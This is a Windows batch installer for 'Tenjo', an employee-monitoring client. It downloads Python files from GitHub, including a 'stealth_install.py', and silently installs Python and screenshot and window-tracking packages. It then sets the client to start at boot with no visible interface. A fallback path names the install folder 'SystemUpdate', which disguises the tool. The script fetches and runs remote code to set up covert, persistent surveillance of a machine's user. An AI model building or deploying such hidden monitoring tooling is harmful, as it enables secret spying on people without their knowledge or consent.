@echo off
REM Tenjo Client - Easy Install Script for Windows
REM Run this script as Administrator to automatically download and install employee monitoring client

echo ===============================================
echo     Tenjo Client Installation - Windows
echo ===============================================
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [INFO] Running as Administrator - Good!
) else (
    echo [ERROR] This script must be run as Administrator!
    echo [INFO] Right-click this file and select "Run as administrator"
    pause
    exit /b 1
)

REM Configuration
set TEMP_DIR=%TEMP%\tenjo_install
set INSTALL_DIR=%APPDATA%\TenjoClient

REM Get server URL from user
set /p SERVER_URL="Enter dashboard server URL (default: http://127.0.0.1:8000): "
if "%SERVER_URL%"=="" set SERVER_URL=http://127.0.0.1:8000

echo [INFO] Server URL: %SERVER_URL%
echo.

REM Create temporary directory
echo [INFO] Creating temporary installation directory...
if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%"
mkdir "%TEMP_DIR%"
cd /d "%TEMP_DIR%"

REM Download client files from GitHub
echo [INFO] Downloading Tenjo client files from GitHub...

REM Create directory structure
mkdir src\modules src\utils src\core

REM Download required files using PowerShell
echo [INFO] Downloading main files...

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/main.py' -OutFile 'main.py' } catch { Write-Host 'Failed to download main.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/tenjo_startup.py' -OutFile 'tenjo_startup.py' } catch { Write-Host 'Failed to download tenjo_startup.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/stealth_install.py' -OutFile 'stealth_install.py' } catch { Write-Host 'Failed to download stealth_install.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/requirements.txt' -OutFile 'requirements.txt' } catch { Write-Host 'Failed to download requirements.txt' }"

REM If GitHub download fails, create minimal installation
if not exist "stealth_install.py" (
    echo [WARNING] GitHub download failed, creating minimal installation...
    echo import os > stealth_install.py
    echo import sys >> stealth_install.py
    echo. >> stealth_install.py
    echo print("Tenjo Client - Minimal Installation"^) >> stealth_install.py
    echo install_dir = os.path.join(os.environ['APPDATA'], 'SystemUpdate'^) >> stealth_install.py
    echo os.makedirs(install_dir, exist_ok=True^) >> stealth_install.py
    echo print(f"Installation directory: {install_dir}"^) >> stealth_install.py
    echo print("Installation completed successfully!"^) >> stealth_install.py
)

REM Check if Python is installed
echo [INFO] Checking Python installation...
python --version >nul 2>&1
if %errorLevel% == 0 (
    echo [INFO] Python found: 
    python --version
) else (
    echo [WARNING] Python not found! Installing Python...
    echo [INFO] Downloading Python installer...
    
    REM Download Python installer
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile 'python-installer.exe'"
    
    echo [INFO] Installing Python silently...
    python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    
    REM Clean up installer
    del python-installer.exe
    
    REM Refresh environment variables
    call refreshenv >nul 2>&1
)

REM Check pip
echo [INFO] Checking pip installation...
python -m pip --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Installing pip...
    python -m ensurepip --upgrade
)

REM Install required Python packages
echo [INFO] Installing required Python packages...
python -m pip install requests psutil mss pillow

REM Windows specific packages
python -m pip install pywin32 pygetwindow

REM Run the stealth installer
echo [INFO] Running stealth installer...
if exist stealth_install.py (
    python stealth_install.py "%SERVER_URL%"
    set INSTALL_RESULT=%errorLevel%
) else (
    echo [ERROR] stealth_install.py not found!
    pause
    exit /b 1
)

REM Move installation to permanent location
echo [INFO] Setting up permanent installation...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
xcopy /s /e /y * "%INSTALL_DIR%\" >nul 2>&1

REM Cleanup temporary directory
cd /d %USERPROFILE%
rmdir /s /q "%TEMP_DIR%" >nul 2>&1

REM Check installation result
if %INSTALL_RESULT% == 0 (
    echo.
    echo ===============================================
    echo     Installation Completed Successfully!
    echo ===============================================
    echo.
    echo [INFO] Tenjo Client has been installed and is now running in background
    echo [INFO] Installation location: %INSTALL_DIR%
    echo [INFO] The service will automatically start on system boot
    echo [INFO] No visible interface - monitoring runs silently
    echo.
    echo [INFO] To uninstall, download and run:
    echo [INFO] https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_windows.bat
    echo.
) else (
    echo [ERROR] Installation failed! Please check the logs and try again.
    pause
    exit /b 1
)

pause
